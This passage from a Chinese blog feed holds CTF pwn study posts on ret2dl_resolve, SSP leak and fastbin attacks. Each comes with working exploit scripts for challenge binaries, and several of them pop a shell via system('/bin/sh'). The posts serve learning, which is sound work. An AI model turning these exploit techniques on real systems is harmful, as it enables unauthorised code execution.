        <content type="html"><![CDATA[<h2 id="scanf"><a href="#scanf" class="headerlink" title="scanf"></a>scanf</h2><p>在linux 16版本中，scanf输入的数据过大超过linux栈空间的最大值（8m），就会自动调用堆块来储存数据。</p><p>在64位系统下，small bin &lt;0x400</p><p>在32位系统下，small bin &lt;0x200</p><p>所以你输入0x400字节数据，就会触发malloc_consolidate，使得fasted bin里的堆块合并到unsorted bin里面。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>对于ret2dl_resolve的探究</title>
      <link href="/2019/10/28/%E5%AF%B9%E4%BA%8Eret2-resolve%E7%9A%84%E6%8E%A2%E7%A9%B6/"/>
      <url>/2019/10/28/%E5%AF%B9%E4%BA%8Eret2-resolve%E7%9A%84%E6%8E%A2%E7%A9%B6/</url>
      
        <content type="html"><![CDATA[<p>关于ret2dl_resolve的研究，其实我个人看的不是很懂，这里算是简单记录一下而已。</p><p>等什么时候真正看懂了，再补上吧。</p><p>网络上前辈的教程：</p><blockquote><p><a href="http://rk700.github.io/2015/08/09/return-to-dl-resolve/" target="_blank" rel="noopener">http://rk700.github.io/2015/08/09/return-to-dl-resolve/</a><br><a href="http://angelboy.logdown.com/posts/283218-return-to-dl-resolve" target="_blank" rel="noopener">http://angelboy.logdown.com/posts/283218-return-to-dl-resolve</a><br><a href="http://pwn4.fun/2016/11/09/Return-to-dl-resolve/" target="_blank" rel="noopener">http://pwn4.fun/2016/11/09/Return-to-dl-resolve/</a><br><a href="https://github.com/inaz2/roputils/blob/master/roputils.py" target="_blank" rel="noopener">https://github.com/inaz2/roputils/blob/master/roputils.py</a></p></blockquote><p>具体的，前辈们已经介绍的很详细了，在这里，我只是赘述自己学到的，整理一下自己能简单理解的东西</p><h1 id="ret2dl-resolve的核心原理"><a href="#ret2dl-resolve的核心原理" class="headerlink" title="ret2dl_resolve的核心原理"></a>ret2dl_resolve的核心原理</h1><p> ret2dl-resolve的核心原理是攻击符号重定位流程，使其解析库中存在的任意函数地址，从而实现got表的劫持。 </p><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><h2 id="为什么要设置延迟绑定"><a href="#为什么要设置延迟绑定" class="headerlink" title="为什么要设置延迟绑定"></a>为什么要设置延迟绑定</h2><p>​        要想回答这个问题，首先我们得从动态链接说起。为了减少存储器浪费，现代操作系统支持动态链接特性。即不是在程序编译的时候就把外部的库函数编译进去，而是在运行时再把包含有对应函数的库加载到内存里。由于内存空间有限，选用函数库的组合无限，显然程序不可能在运行之前就知道自己用到的函数会在哪个地址上。</p><p>​        比如说对于libc.so来说，我们要求把它加载到地址0x1000处，A程序只引用了libc.so，从理论上来说这个要求不难办到。但是对于用了liba,so, libb.so, libc.so……liby.so, libz.so的B程序来说，0x1000这个地址可能就被liba.so等库占据了。因此，程序在运行时碰到了外部符号，就需要去找到它们真正的内存地址，这个过程被称为重定位。</p><p>​        为了安全，现代操作系统的设计要求代码所在的内存必须是不可修改的，那么诸如call read一类的指令即没办法在编译阶段直接指向read函数所在地址，又没办法在运行时修改成read函数所在地址，怎么保证CPU在运行到这行指令时能正确跳到read函数呢？这就需要got表（Global Offset Table，全局偏移表）和plt表（Procedure Linkage Table，过程链接表）进行辅助了。 </p><p>​         在延迟加载的情况下，每个外部函数的got表都会被初始化成plt表中对应项的地址。当call指令执行时，EIP直接跳转到plt表的一个jmp，这个jmp直接指向对应的got表地址，从这个地址取值。此时这个jmp会跳到保存好的，plt表中对应项的地址，在这里把每个函数重定位过程中唯一的不同点，即一个数字入栈（本例子中write是18h,read是0，对于单个程序来说，这个数字是不变的），然后push got[1]并跳转到got[2]保存的地址。在这个地址中对函数进行了重定位，并且修改got表为真正的函数地址。当第二次调用同一个函数的时候，call仍然使EIP跳转到plt表的同一个jmp，不同的是这回从got表取值取到的是真正的地址，从而避免重复进行重定位。 </p><p>进行跟进分析后，发现，主要影响重定位的，是</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">_dl_fixup (</span><br><span class="line"># ifdef ELF_MACHINE_RUNTIME_FIXUP_ARGS</span><br><span class="line">           ELF_MACHINE_RUNTIME_FIXUP_ARGS,</span><br><span class="line"># endif</span><br><span class="line">           struct link_map *__unbounded l, ElfW(Word) reloc_arg)</span><br></pre></td></tr></table></figure><p>中的reloc_arg， 我们主要控制reloc_arg进行攻击。</p><h1 id="x86"><a href="#x86" class="headerlink" title="x86"></a>x86</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x/3i read 0x80482f0 &lt;read@plt&gt;:        jmp    DWORD PTR ds:0x804970c</span><br><span class="line">   0x80482f6 &lt;read@plt+6&gt;:      push   0x0</span><br><span class="line">   0x80482fb &lt;read@plt+11&gt;:     jmp    0x80482e0</span><br><span class="line">gdb-peda$ x/wx 0x804970c</span><br><span class="line">0x804970c &lt;read@got.plt&gt;:       0x080482f6</span><br><span class="line">gdb-peda$ x/2i 0x80482e0</span><br><span class="line">   0x80482e0:   push   DWORD PTR ds:0x8049704</span><br><span class="line">   0x80482e6:   jmp    DWORD PTR ds:0x8049708</span><br></pre></td></tr></table></figure><p>在第一次调用时，<code>jmp read@got.plt</code>会跳回<code>read@plt</code>，这是我们已经知道的。接下来，会将参数push到栈上并跳至<code>.got.plt+0x8</code>，这相当于调用以下函数：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_dl_runtime_resolve(link_map, rel_offset);</span><br></pre></td></tr></table></figure><p>​        </p><p>​        这就是重定位符号表，因为第一次调用函数的时候，并不是直接跳转到libc空间中的函数，而是在这个函数被调用了，才去把这个函数在libc的地址放到GOT表中。接下来，会通过两次push，最后跳到libc的_dl_runtime_resolve去执行。_dl_runtime_resolve的目的，是根据push 的两个参数导出函数的地址，然后放到相应的GOT表，并且调用它。 </p><p>那么，我们的思路是在内存中伪造Elf32_Rel和Elf32_Sym两个结构体，并手动传递reloc_arg使其指向我们伪造的结构体，让Elf32_Sym.st_name的偏移值指向预先放在内存中的字符串system完成攻击。 </p><h1 id="x64"><a href="#x64" class="headerlink" title="x64"></a>x64</h1><p>​        方法变成了覆盖 (link_map + 0x1c8) 处为 NULL, 也就是<code>if (l-&gt;l_info[VERSYMIDX (DT_VERSYM)] != NULL)</code>这一句.<br>​        但是link_map是在ld.so上的,因此我们需要leak,若程序没有输出函数,则无法使用这个方法. </p><h1 id="使用ROPutils简化攻击步骤"><a href="#使用ROPutils简化攻击步骤" class="headerlink" title="使用ROPutils简化攻击步骤"></a>使用ROPutils简化攻击步骤</h1><p>使用通常的构造payload过程繁琐，虽然格式化，但是还是不利于我们编写。故此，我们使用roputils.py这个模块进行ret2_dl_resolve攻击</p><p>以 XMAN 2016-level3/level4 为例</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> roputils <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#为了防止命名冲突，这个脚本全部只使用roputils中的代码。如果需要使用pwntools中的代码需要在import roputils前import pwn，以使得roputils中的ROP覆盖掉pwntools中的ROP</span></span><br><span class="line"></span><br><span class="line">rop = ROP(<span class="string">'./level4'</span>)                        <span class="comment">#ROP继承了ELF类，下面的section, got, plt都是调用父类的方法</span></span><br><span class="line">bss_addr = rop.section(<span class="string">'.bss'</span>)</span><br><span class="line">read_got = rop.got(<span class="string">'read'</span>)</span><br><span class="line">read_plt = rop.plt(<span class="string">'read'</span>)</span><br><span class="line"></span><br><span class="line">offset = <span class="number">140</span></span><br><span class="line"></span><br><span class="line">io = Proc(host = <span class="string">'172.17.0.2'</span>, port = <span class="number">10001</span>)        <span class="comment">#roputils中这里需要显式指定参数名</span></span><br><span class="line"></span><br><span class="line">buf = rop.fill(offset)                        <span class="comment">#fill用于生成填充数据</span></span><br><span class="line">buf += rop.call(read_plt, <span class="number">0</span>, bss_addr, <span class="number">0x100</span>)        <span class="comment">#call可以通过某个函数的plt地址方便地进行调用</span></span><br><span class="line">buf += rop.dl_resolve_call(bss_addr+<span class="number">0x20</span>, bss_addr)        <span class="comment">#dl_resolve_call有一个参数base和一个可选参数列表*args。base为伪造的link_map所在地址，*args为要传递给被劫持调用的函数的参数。这里我们将"/bin/sh\x00"放置在bss_addr处，link_map放置在bss_addr+0x20处</span></span><br><span class="line"></span><br><span class="line">io.write(buf)</span><br><span class="line"></span><br><span class="line">然后我们直接用dl_resolve_data生成伪造的link_map并发送</span><br><span class="line">buf = rop.string(<span class="string">'/bin/sh'</span>)                </span><br><span class="line">buf += rop.fill(<span class="number">0x20</span>, buf)                <span class="comment">#如果fill的第二个参数被指定，相当于将第二个参数命名的字符串填充至指定长度</span></span><br><span class="line">buf += rop.dl_resolve_data(bss_addr+<span class="number">0x20</span>, <span class="string">'system'</span>)        <span class="comment">#dl_resolve_data的参数也非常简单，第一个参数是伪造的link_map首地址，第二个参数是要伪造的函数名</span></span><br><span class="line">buf += rop.fill(<span class="number">0x100</span>, buf)</span><br><span class="line"></span><br><span class="line">io.write(buf)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>对于canary的ssp leak打法的学习（好像又名Stack smash）</title>
      <link href="/2019/10/28/%E5%AF%B9%E4%BA%8Ecanary%E7%9A%84ssp-leak%E6%89%93%E6%B3%95%E7%9A%84%E5%AD%A6%E4%B9%A0%EF%BC%88%E5%A5%BD%E5%83%8F%E5%8F%88%E5%90%8DStack-smash%EF%BC%89/"/>
      <url>/2019/10/28/%E5%AF%B9%E4%BA%8Ecanary%E7%9A%84ssp-leak%E6%89%93%E6%B3%95%E7%9A%84%E5%AD%A6%E4%B9%A0%EF%BC%88%E5%A5%BD%E5%83%8F%E5%8F%88%E5%90%8DStack-smash%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<p>这里恬不知耻的先粘贴一大段i春秋关于ssp leak打法的讲解。<del>其实就是菜，自己讲不出个所以然</del></p><p> 除了通过各种方法泄露canary之外，我们还有一个可选项——利用<code>__stack_chk_fail</code>函数泄露信息。这种方法作用不大，没办法让我们getshell。但是当我们需要泄露的flag或者其他东西存在于内存中时，我们可能可以使用一个栈溢出漏洞来把它们泄露出来。这个方法叫做<code>SSP(Stack Smashing Protect) Leak</code>.<br>在开始之前，我们先来回顾一下canary起作用到程序退出的流程。首先，canary被检测到修改，函数不会经过正常的流程结束栈帧并继续执行接下来的代码，而是跳转到<code>call __stack_chk_fail</code>处，然后对于我们来说，执行完这个函数，程序退出，屏幕上留下一行<br><code>*** stack smashing detected ***:[XXX] terminated</code>。这里的[XXX]是程序的名字。很显然，这行字不可能凭空产生，肯定是<code>__stack_chk_fail</code>打印出来的。而且，程序的名字一定是个来自外部的变量（毕竟ELF格式里面可没有保存程序名）。既然是个来自外部的变量，就有修改的余地。我们看一下<code>__stack_chk_fail</code>的源码，会发现其实现如下： </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> __attribute__ ((noreturn)) __stack_chk_fail (<span class="keyword">void</span>) </span><br><span class="line">&#123;  </span><br><span class="line">    __fortify_fail (<span class="string">"stack smashing detected"</span>); </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">void</span> __attribute__ ((noreturn)) internal_function __fortify_fail (<span class="keyword">const</span> <span class="keyword">char</span> *msg) </span><br><span class="line">&#123;  </span><br><span class="line">    <span class="comment">/* The loop is added only to keep gcc happy. */</span> </span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)   </span><br><span class="line">        __libc_message (<span class="number">2</span>, <span class="string">"*** %s ***: %s terminated\n"</span>,             </span><br><span class="line">                        msg, __libc_argv[<span class="number">0</span>] ?: <span class="string">"&lt;unknown&gt;"</span>); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> 我们看到<code>__libc_message</code>一行输出了<code>*** %s ***: %s terminated\n</code>。这里的参数分别是msg和<code>__libc_argv[0]</code>。<code>char *argv[]</code>是main函数的参数，<code>argv[0]</code>存储的就是程序名，且这个argv[0]就存在于栈上。</p><p>这里贴一个vidar的 Veritas501 师傅的讲解</p><p>可见，__libc_message 的第二个<code>%s</code>输出的是argv[0]，argv[0]是指向第一个启动参数字符串的指针，而在栈中，大概是这样一个画风 </p><img src="/2019/10/28/对于canary的ssp-leak打法的学习（好像又名Stack-smash）/canary_a768142147ca3976598941b5c6c67161.png"><p>所以SSP leak的玩法就是通过修改栈上的argv[0]指针，从而让<code>__stack_chk_fail</code>被触发后输出我们想要知道的东西。 </p><p>所以……  这位vidar的pwn王意思就是，管他三七二十一，暴力覆盖就是了，别管多长，只要你要的数据的地址你能拿到，覆盖！</p><p>这里放一个例题，三叶草的纳新题，canary2</p><img src="/2019/10/28/对于canary的ssp-leak打法的学习（好像又名Stack-smash）/20191023235955.png"><p>一看，无法泄露，也不能爆破，那自然就想到ssp leak打法</p><p>flag的地址在buf里面，你又能通过printf  get  buf地址。 那剩下的就只有暴力覆盖了</p><p>这里贴上exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">sh = process(<span class="string">'./canary2'</span>)</span><br><span class="line"><span class="comment">#sh = remote('pwnto.fun',10007)</span></span><br><span class="line">sh.recvuntil(<span class="string">'key: '</span>)</span><br><span class="line">key = sh.recv(<span class="number">9</span>)</span><br><span class="line">log.success(<span class="string">"the key="</span>+ key)</span><br><span class="line">key = key[<span class="number">2</span>:]</span><br><span class="line">log.success(<span class="string">"the key="</span>+ key)</span><br><span class="line">key = int(key,<span class="number">16</span>)</span><br><span class="line">payload = p64(key)*<span class="number">200</span></span><br><span class="line">sh.send(payload)</span><br><span class="line">sh.recv()</span><br><span class="line">sh.sendline()</span><br><span class="line">sh.recv()</span><br></pre></td></tr></table></figure><p>​        对了，这里记录一点我个人的小问题，recv接收后的key是字符串类型，所以不进行p64(key)直接发过去的是ascll，不是我们想要的指针类型。</p><p>​        寻思着，那打包一下就可以了吧。发现p64(key)失败，探究了一下，发现是字符串型转字符串型失败。又想着key = int(key)，也不成功。那是因为，int()是有两个参数的，我以前一直以为直接int(x)就好了。2333333333</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>fastedbin attack 探究</title>
      <link href="/2019/10/28/%C2%96fastedbin-attack-%E6%8E%A2%E7%A9%B6/"/>
      <url>/2019/10/28/%C2%96fastedbin-attack-%E6%8E%A2%E7%A9%B6/</url>
      
        <content type="html"><![CDATA[<p>总结一下， fasted bin attack有两种打法</p><p>第一种是侧重free函数释放真的chunk或伪造的chunk，然后再次申请chunk进行攻击。</p><p>第二种是侧重fd指针，将其修改，进行堆块的任意地址分配，从而达到任意地址写。</p><p>（其实个人感觉，总的来说，最终目的都是针对于fd进行操作）</p><h2 id="第一种：fake-chunk"><a href="#第一种：fake-chunk" class="headerlink" title="第一种：fake chunk"></a>第一种：fake chunk</h2><h3 id="fastbin-double-free"><a href="#fastbin-double-free" class="headerlink" title="fastbin double free"></a>fastbin double free</h3><p> Fastbin Double Free 是指 fastbin 的 chunk 可以被多次释放，因此可以在 fastbin 链表中存在多次 。</p><p>类似于 <img src="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/figure/fastbin_free_chunk3.png" alt="img"> </p><p>此时，chunk1被再次释放，其fd指向chunk2。</p><p>我们进行第一次malloc，得到chunk1，然后在chunk1.fd的位置写入你想要的地址，然后进行第二次malloc，获得chunk2，再进行第三次malloc，再次得到chunk1，因为此时chunk1的fd已经被你修改为你想要的地址，所以你进行第四次malloc的时候，会依据你chunk1.fd的内容在那个地址进行堆块分配。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">chunk</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> pre_size;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> size;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> fd;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> bk;</span><br><span class="line">&#125; CHUNK,*PCHUNK;</span><br><span class="line"></span><br><span class="line">CHUNK bss_chunk;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">void</span> *chunk1,*chunk2,*chunk3;</span><br><span class="line">    <span class="keyword">void</span> *chunk_a,*chunk_b;</span><br><span class="line"></span><br><span class="line">    bss_chunk.size=<span class="number">0x21</span>;</span><br><span class="line">    chunk1=<span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    chunk2=<span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(chunk1);</span><br><span class="line">    <span class="built_in">free</span>(chunk2);</span><br><span class="line">    <span class="built_in">free</span>(chunk1);</span><br><span class="line"></span><br><span class="line">    chunk_a=<span class="built_in">malloc</span>(<span class="number">0x10</span>);<span class="comment">//chunk1</span></span><br><span class="line">    *(<span class="keyword">long</span> <span class="keyword">long</span> *)chunk_a=&amp;bss_chunk;</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>);<span class="comment">//chunk2</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>);<span class="comment">//再一次malloc的chunk1</span></span><br><span class="line">    chunk_b=<span class="built_in">malloc</span>(<span class="number">0x10</span>);<span class="comment">//此时根据你第一次malloc时写好的chunk1.fd进行分配堆块。</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%p"</span>,chunk_b);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="House-Of-Spirit"><a href="#House-Of-Spirit" class="headerlink" title="House Of Spirit"></a>House Of Spirit</h3><p> 该技术的核心在于在目标位置处伪造 fastbin chunk，并将其释放，从而达到分配<strong>指定地址</strong>的 chunk 的目的。 </p><h2 id="第二种：利用fd指针"><a href="#第二种：利用fd指针" class="headerlink" title="第二种：利用fd指针"></a>第二种：利用fd指针</h2><h3 id="Arbitrary-Alloc"><a href="#Arbitrary-Alloc" class="headerlink" title="Arbitrary Alloc"></a>Arbitrary Alloc</h3><h4 id="easy-pwn"><a href="#easy-pwn" class="headerlink" title="easy_pwn"></a>easy_pwn</h4><p>这题来源于roar ctf。</p><p>这题的漏洞点在于write的时候出现了off by one漏洞，漏洞规则在于 只要你edit的size比原size大10，就可造成off by one。利用就是off by one + chunk overlapping + fasted bin attack</p><p>那么结合exp开始深入分析</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">'./easy_pwn'</span>)</span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size)</span>:</span></span><br><span class="line">    sh.sendlineafter(<span class="string">': '</span>, <span class="string">'1'</span>)</span><br><span class="line">    sh.sendlineafter(<span class="string">': '</span>, str(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index, size, content)</span>:</span></span><br><span class="line">    sh.sendlineafter(<span class="string">': '</span>, <span class="string">'2'</span>)</span><br><span class="line">    sh.sendlineafter(<span class="string">': '</span>, str(index))</span><br><span class="line">    sh.sendlineafter(<span class="string">': '</span>, str(size))</span><br><span class="line">    sh.sendafter(<span class="string">': '</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(index)</span>:</span></span><br><span class="line">    sh.sendlineafter(<span class="string">': '</span>, <span class="string">'3'</span>)</span><br><span class="line">    sh.sendlineafter(<span class="string">': '</span>, str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(index)</span>:</span></span><br><span class="line">    sh.sendlineafter(<span class="string">': '</span>, <span class="string">'4'</span>)</span><br><span class="line">    sh.sendlineafter(<span class="string">': '</span>, str(index))</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x18</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x18</span>)<span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x68</span>)<span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x10</span>)<span class="comment">#3</span></span><br></pre></td></tr></table></figure><p>此处先构造好堆块，为什么设置0x18呢。</p> <img src="/2019/10/28/fastedbin-attack-探究/1571551706196.png"> <p>这题的规则就是你create的size位多少，它就允许你写入多少，off by one修改下一堆块的size位的话，自然需要0x18的size，覆盖pre_size，使得off by one能够覆盖下一堆块的size位。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">edit(<span class="number">0</span>,<span class="number">0x18</span> +<span class="number">10</span>, <span class="string">'a'</span>*<span class="number">0x18</span> + p8(<span class="number">0x91</span>) )</span><br></pre></td></tr></table></figure><img src="/2019/10/28/fastedbin-attack-探究/1571551912003.png"><p>成功修改！注意，这里使用了堆叠技巧。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">delete(<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p>将整个0x91的伪造堆块放入unsorted bin里面，这里系统以为它将chunk1与chunk2一起放入了unsorted bin，但是实际上只放入了chunk1</p><img src="/2019/10/28/fastedbin-attack-探究/1571552115654.png"><img src="/2019/10/28/fastedbin-attack-探究/1571552133076.png"><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x18</span>)</span><br></pre></td></tr></table></figure><p>这里是为了create分割堆块，使得unsorted bin的地址落入chunk2的内容里。因为chunk2实际上没有被free，所以允许show出地址。同时为了下面的fastedbin attack做准备。</p><img src="/2019/10/28/fastedbin-attack-探究/1571552279804.png"><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">show(<span class="number">2</span>)</span><br><span class="line">sh.recvuntil(<span class="string">'content: '</span>)</span><br><span class="line">result = u64(sh.recvuntil(<span class="string">'\x7f'</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">log.success(<span class="string">'result = '</span> + hex(result))</span><br><span class="line"><span class="comment">#gdb.attach(sh)</span></span><br><span class="line">libc_addr = result - <span class="number">0x3c4b78</span></span><br></pre></td></tr></table></figure><p>此处的0x3c4b78是根据leak出的 unsorted bin 地址减去 /proc/线程号/maps里的libc基址得到的。</p><p>因为偏移量是不变的</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">edit(<span class="number">2</span>, <span class="number">0x10</span>, p64(<span class="number">0</span>) + p64(libc_addr + libc.symbols[<span class="string">'__free_hook'</span>] - <span class="number">0x40</span>))</span><br><span class="line">gdb.attach(sh)</span><br></pre></td></tr></table></figure><img src="/2019/10/28/fastedbin-attack-探究/1571553593599.png"><p>此处修改bk为__free_hook - 0x40的地址</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x68</span>)<span class="comment">#4</span></span><br><span class="line">delete(<span class="number">4</span>)</span><br></pre></td></tr></table></figure><img src="/2019/10/28/fastedbin-attack-探究/1571556976417.png"> <img src="/2019/10/28/fastedbin-attack-探究/1571553628633.png"> <p>此处为了使得fasted bin 0x70里面存在free后的堆块，使得后面fd攻击成功</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">edit(<span class="number">2</span>, <span class="number">8</span>, p64(libc_addr + libc.symbols[<span class="string">'__free_hook'</span>] - <span class="number">0x33</span>))</span><br></pre></td></tr></table></figure><p>修改fd位</p><img src="/2019/10/28/fastedbin-attack-探究/1571557000576.png"><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x68</span>)<span class="comment">#5</span></span><br></pre></td></tr></table></figure><img src="/2019/10/28/fastedbin-attack-探究/1571554995553.png"><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x68</span>)<span class="comment">#6</span></span><br><span class="line">edit(<span class="number">5</span>, <span class="number">0x23</span> + <span class="number">8</span>, <span class="string">''</span> * <span class="number">0x23</span> + p64(libc_addr + libc.symbols[<span class="string">'system'</span>]))</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,<span class="number">8</span>,<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>360赛</title>
      <link href="/2019/10/19/360%E8%B5%9B/"/>
      <url>/2019/10/19/360%E8%B5%9B/</url>
      
